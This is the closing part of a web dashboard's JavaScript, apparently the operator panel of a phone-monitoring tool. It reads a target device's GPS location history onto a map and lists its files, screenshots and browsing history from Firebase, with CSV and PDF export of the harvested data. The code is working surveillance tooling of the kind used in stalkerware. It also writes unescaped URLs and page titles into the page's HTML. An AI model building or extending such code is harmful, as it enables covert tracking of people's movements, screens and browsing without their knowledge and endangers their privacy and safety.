                            </tbody>
                        </table>`;
                } else {
                    html = createEmptyState('No battery information available.', 'fas fa-battery-empty');
                }
                batteryDataEl.innerHTML = html;
            });
        }

        async function loadGpsLocation(uid) {
            await loadLeaflet(); // Ensure Leaflet is loaded
            gpsMapEl.innerHTML = createLoadingSpinner();
            gpsDataListEl.innerHTML = '';

            addDeviceDataListener('gpsLocation', (snapshot) => {
                const locations = snapshot.val();
                gpsMapEl.innerHTML = ''; // Clear spinner
                gpsDataListEl.innerHTML = '';

                if (mapInstance) {
                    mapInstance.remove();
                    mapInstance = null;
                }
                mapInstance = L.map(gpsMapEl);
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                }).addTo(mapInstance);

                if (locations && Object.keys(locations).length > 0) {
                    const latLngs = [];
                    let tableHtml = '<table class="table table-sm table-striped" id="gps-table-export"><thead><tr><th>Latitude</th><th>Longitude</th><th>Timestamp</th></tr></thead><tbody>';
                    
                    Object.values(locations).sort((a,b) => (b.timestamp || 0) - (a.timestamp || 0)).forEach(loc => {
                        if (loc.latitude && loc.longitude) {
                            const latLng = [loc.latitude, loc.longitude];
                            latLngs.push(latLng);
                            L.marker(latLng).addTo(mapInstance)
                                .bindPopup(`<b>Time:</b> ${formatTimestamp(loc.timestamp)}<br><b>Coords:</b> ${loc.latitude.toFixed(5)}, ${loc.longitude.toFixed(5)}`);
                            tableHtml += `<tr><td>${loc.latitude.toFixed(5)}</td><td>${loc.longitude.toFixed(5)}</td><td>${formatTimestamp(loc.timestamp)}</td></tr>`;
                        }
                    });
                    tableHtml += '</tbody></table>';
                    gpsDataListEl.innerHTML = tableHtml;

                    if (latLngs.length > 0) {
                        mapInstance.fitBounds(latLngs, { padding: [50, 50] });
                        if (latLngs.length === 1) mapInstance.setView(latLngs[0], 15); // Zoom in for single point
                    } else {
                         mapInstance.setView([0, 0], 2); // Default view if no valid points
                         gpsDataListEl.innerHTML = createEmptyState('No valid GPS coordinates found.', 'fas fa-map-marked-alt');
                    }
                } else {
                    mapInstance.setView([0, 0], 2);
                    gpsDataListEl.innerHTML = createEmptyState('No GPS data available.', 'fas fa-map-marked-alt');
                }
            });
        }

        function loadFileSystemLogs(uid) {
            addDeviceDataListener('fileExplorer', (snapshot) => {
                const fileSystem = snapshot.val();
                let html = '';
                if (fileSystem && Object.keys(fileSystem).length > 0) {
                    // This function would need to recursively build the tree for nested folders
                    function renderFileTree(node, path = '') {
                        let listHtml = '<ul>';
                        for (const key in node) {
                            const currentPath = path ? `${path}/${key}` : key;
                            if (typeof node[key] === 'object' && node[key] !== null && !node[key].fileName) { // Assume it's a folder
                                listHtml += `<li><i class="fas fa-folder folder-icon"></i> ${key}`;
                                listHtml += renderFileTree(node[key], currentPath);
                                listHtml += '</li>';
                            } else { // Assume it's a file or file metadata object
                                const fileName = node[key].fileName || key;
                                const timestamp = node[key].timestamp ? ` <small class="text-muted">(${formatTimestamp(node[key].timestamp)})</small>` : '';
                                listHtml += `<li><i class="fas fa-file file-icon"></i> ${fileName}${timestamp}</li>`;
                            }
                        }
                        listHtml += '</ul>';
                        return listHtml;
                    }
                    html = renderFileTree(fileSystem);
                    // Create a flat list for export
                    let flatFiles = [];
                    function flattenFileTree(node, currentPath = '') {
                        for (const key in node) {
                            const itemPath = currentPath ? `${currentPath}/${key}` : key;
                            if (typeof node[key] === 'object' && node[key] !== null && !node[key].fileName) {
                                flattenFileTree(node[key], itemPath);
                            } else {
                                flatFiles.push({ path: itemPath, name: node[key].fileName || key, timestamp: node[key].timestamp });
                            }
                        }
                    }
                    flattenFileTree(fileSystem);
                    filesDataEl.dataset.exportData = JSON.stringify(flatFiles); // Store for export

                } else {
                    html = createEmptyState('No file logs available.', 'far fa-folder-open');
                }
                filesDataEl.innerHTML = html;
            });
        }

        function loadScreenshots(uid) {
            addDeviceDataListener('screenshots', async (snapshot) => {
                const screenshotEntries = snapshot.val();
                screenshotsDataEl.innerHTML = createLoadingSpinner();
                if (screenshotEntries && Object.keys(screenshotEntries).length > 0) {
                    let htmlContent = '';
                    const sortedEntries = Object.values(screenshotEntries).sort((a,b) => (b.timestamp || 0) - (a.timestamp || 0));
                    
                    for (const entry of sortedEntries) {
                        if (entry.url) { // Assuming URL is path in Firebase Storage, e.g., 'DEVICE_UID/screenshots/image.jpg'
                            try {
                                const downloadUrl = await getDownloadURL(storageRef(storage, entry.url));
                                htmlContent += `
                                    <div class="col-md-4 col-sm-6 mb-3 screenshot-item fade-in">
                                        <img src="${downloadUrl}" alt="Screenshot taken at ${formatTimestamp(entry.timestamp)}" class="img-thumbnail" loading="lazy"
                                             onclick="openImageModal('${downloadUrl}')">
                                        <p class="text-center small text-muted">${formatTimestamp(entry.timestamp)}</p>
                                    </div>`;
                            } catch (error) {
                                console.error("Error getting screenshot download URL:", error, entry.url);
                                htmlContent += `<div class="col-md-4 col-sm-6 mb-3 text-danger">Error loading screenshot: ${entry.url}</div>`;
                            }
                        }
                    }
                    screenshotsDataEl.innerHTML = htmlContent || createEmptyState('No screenshots found or error loading them.', 'far fa-image');
                } else {
                    screenshotsDataEl.innerHTML = createEmptyState('No screenshots available.', 'far fa-image');
                }
            });
        }
        window.openImageModal = (url) => { // Make it global for inline onclick
            const modalHtml = `
                <div class="modal fade" id="imagePreviewModal" tabindex="-1" aria-labelledby="imagePreviewModalLabel" aria-hidden="true">
                  <div class="modal-dialog modal-lg modal-dialog-centered">
                    <div class="modal-content" style="background-color: var(--dark-card);">
                      <div class="modal-header" style="border-bottom-color: var(--accent-blue);">
                        <h5 class="modal-title" id="imagePreviewModalLabel" style="color: var(--accent-cyan);">Image Preview</h5>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                      </div>
                      <div class="modal-body text-center">
                        <img src="${url}" class="img-fluid" alt="Preview">
                      </div>
                    </div>
                  </div>
                </div>`;
            if (document.getElementById('imagePreviewModal')) {
                document.getElementById('imagePreviewModal').remove();
            }
            document.body.insertAdjacentHTML('beforeend', modalHtml);
            const imageModal = new bootstrap.Modal(document.getElementById('imagePreviewModal'));
            imageModal.show();
        }

        function loadBrowsingHistory(uid) {
            addDeviceDataListener('browsingHistory', (snapshot) => {
                const logs = snapshot.val();
                let html = '';
                if (logs && Object.keys(logs).length > 0) {
                    html = '<table class="table table-sm table-striped" id="browsing-table-export"><thead><tr><th>URL</th><th>Title</th><th>Timestamp</th></tr></thead><tbody>';
                    Object.values(logs).sort((a,b) => (b.timestamp || 0) - (a.timestamp || 0)).forEach(log => {
                        html += `<tr>
                                    <td><a href="${log.url}" target="_blank" rel="noopener noreferrer">${log.url}</a></td>
                                    <td>${log.title || 'N/A'}</td>
                                    <td>${formatTimestamp(log.timestamp)}</td>
                                 </tr>`;
                    });
                    html += '</tbody></table>';
                } else {
                    html = createEmptyState('No browsing history available.', 'fas fa-history');
                }
                browsingDataEl.innerHTML = html;
            });
        }

        // --- Export Functionality ---
        document.querySelectorAll('.export-btn').forEach(button => {
            button.addEventListener('click', async (e) => {
                const type = e.target.dataset.type;
                const format = e.target.dataset.format;
                
                if (format === 'pdf') await loadJsPDF();

                let dataToExport;
                let headers = [];
                let rows = [];
                let fileName = `${currentDeviceUID}_${type}_${new Date().toISOString().slice(0,10)}`;

                const tableElement = document.getElementById(`${type}-table-export`);

                if (tableElement) { // For table-based data
                    headers = Array.from(tableElement.querySelectorAll('thead th')).map(th => th.textContent);
                    rows = Array.from(tableElement.querySelectorAll('tbody tr')).map(tr => 
                        Array.from(tr.querySelectorAll('td')).map(td => td.textContent.trim())
                    );
                } else if (type === 'info') { // Special handling for info (key-value)
                    const infoItems = document.querySelectorAll('#info-data table tbody tr');
                    headers = ["Property", "Value"];
                    infoItems.forEach(item => {
                        rows.push([item.cells[0].textContent, item.cells[1].textContent]);
                    });
                } else if (type === 'battery') {
                    const batteryItems = document.querySelectorAll('#battery-data table tbody tr');
                    headers = ["Property", "Value"];
                    batteryItems.forEach(item => {
                        rows.push([item.cells[0].textContent, item.cells[1].textContent]);
                    });
                } else if (type === 'files') {
                    const flatFilesData = filesDataEl.dataset.exportData;
                    if (flatFilesData) {
                        const files = JSON.parse(flatFilesData);
                        headers = ["Path", "Name", "Timestamp"];
                        files.forEach(file => {
                            rows.push([file.path, file.name, formatTimestamp(file.timestamp)]);
                        });
                    } else {
                        alert('No file data to export.'); return;
                    }
                } else {
                    alert('Export not implemented for this section or no data table found.');
                    return;
                }
                
                if (rows.length === 0) {
                    alert('No data to export.');
                    return;
                }

                if (format === 'csv') {
                    exportToCSV(headers, rows, `${fileName}.csv`);
                } else if (format === 'pdf' && jsPDFModule && autoTableModule) {
                    exportToPDF(headers, rows, `${fileName}.pdf`, `Device ${type} Logs`);
                }
            });
        });

        function exportToCSV(headers, rows, filename) {
            let csvContent = "data:text/csv;charset=utf-8,";
            csvContent += headers.join(",") + "\r\n";
            rows.forEach(rowArray => {
                let row = rowArray.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(",");
                csvContent += row + "\r\n";
            });

            const encodedUri = encodeURI(csvContent);
            const link = document.createElement("a");
            link.setAttribute("href", encodedUri);
            link.setAttribute("download", filename);
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        function exportToPDF(headers, rows, filename, title) {
            const { jsPDF } = jsPDFModule; // Use the loaded module
            const doc = new jsPDF();
            doc.text(title, 14, 16);
            autoTableModule(doc, { // Use the loaded autoTable
                head: [headers],
                body: rows,
                startY: 20,
                theme: 'grid',
                styles: {
                    font: 'helvetica',
                    fontSize: 8,
                    cellPadding: 1,
                    overflow: 'linebreak'
                },
                headStyles: { fillColor: [22, 160, 133] }, // Dark cyan like color
                columnStyles: { text: { cellWidth: 'auto' } }
            });
            doc.save(filename);
        }

    </script>
</body>
</html>